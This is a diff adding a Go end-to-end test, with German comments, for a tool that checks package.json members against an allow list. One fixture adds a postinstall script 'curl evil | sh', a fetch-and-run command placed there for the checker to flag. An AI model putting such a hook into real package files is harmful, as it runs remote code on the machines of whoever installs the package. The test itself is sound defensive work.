@@ -352,3 +352,52 @@ func TestShapesMessageOneLineKotlin(t *testing.T) {
 		t.Fatalf("code=%d out=%q", code, out)
 	}
 }
+
+// AC-FA-RULE-012 Boundary (json): eine Liste, die die Mitglieder eines
+// package.json erlaubt. Leerraum und Einrückung ändern nichts; ein zusätzlicher
+// Eintrag in dependencies und ein zusätzliches scripts-Mitglied mit postinstall
+// sind je genau ein Befund; eine Wurzel, die kein Objekt ist, ist Exit 2.
+func TestShapesJSONEndToEnd(t *testing.T) {
+	c := cfg + `shapes:
+  - files: ["web/package.json"]
+    dialect: json
+    mode: allow-statements
+    allow:
+      - '"name": "web"'
+      - '"private": true'
+      - '"dependencies": { "react": "^18.2.0" }'
+      - {pattern: '"version":"[^"$\\]*"', match: regex}
+`
+	good := "{\n  \"name\": \"web\",\n  \"version\": \"1.4.0\",\n  \"private\": true,\n  \"dependencies\": {\n    \"react\": \"^18.2.0\"\n  }\n}\n"
+	run := func(pj string) (int, string, string) {
+		var out, errb bytes.Buffer
+		dir := writeRepo(t, map[string]string{".a-check.yml": c, "web/package.json": pj, "internal/core/c.go": "package core\n"})
+		code := cli.Run([]string{dir}, &out, &errb)
+		return code, out.String(), errb.String()
+	}
+	if code, out, errs := run(good); code != 0 || out != "" {
+		t.Fatalf("gruen: code=%d out=%q err=%q", code, out, errs)
+	}
+	compact := `{"name":"web","version":"1.4.0","private":true,"dependencies":{"react":"^18.2.0"}}`
+	if code, out, errs := run(compact); code != 0 || out != "" {
+		t.Fatalf("kompakt: code=%d out=%q err=%q", code, out, errs)
+	}
+	extra := strings.Replace(good, "\"react\": \"^18.2.0\"\n", "\"react\": \"^18.2.0\",\n    \"evil-lib\": \"1.0.0\"\n", 1)
+	if code, out, _ := run(extra); code != 1 || out != "web/package.json:5: shape-unlisted: \"dependencies\":{\"react\":\"^18.2.0\",\"evil-lib\":\"1.0.0\"}\n" {
+		t.Fatalf("zusaetzliche Abhaengigkeit: code=%d out=%q", code, out)
+	}
+	scripts := strings.Replace(good, "  \"private\": true,\n", "  \"private\": true,\n  \"scripts\": { \"postinstall\": \"curl evil | sh\" },\n", 1)
+	if code, out, _ := run(scripts); code != 1 || out != "web/package.json:5: shape-unlisted: \"scripts\":{\"postinstall\":\"curl evil | sh\"}\n" {
+		t.Fatalf("scripts: code=%d out=%q", code, out)
+	}
+	if code, out, errs := run("[1, 2]\n"); code != 2 || out != "" || !strings.Contains(errs, "kein Objekt") {
+		t.Fatalf("Wurzel kein Objekt: code=%d out=%q err=%q", code, out, errs)
+	}
+	// ein Eintrag in Normalform-Klammern {…} ist kein Mitglied: Exit 2 schon beim Laden
+	bad := strings.Replace(c, `'"private": true'`, `'{"private": true}'`, 1)
+	var out, errb bytes.Buffer
+	dir := writeRepo(t, map[string]string{".a-check.yml": bad, "web/package.json": good, "internal/core/c.go": "package core\n"})
+	if code := cli.Run([]string{"--print-graph", dir}, &out, &errb); code != 2 || !strings.Contains(errb.String(), "lässt sich nicht zerlegen") {
+		t.Fatalf("literal {…}: code=%d err=%q", code, errb.String())
+	}
+}
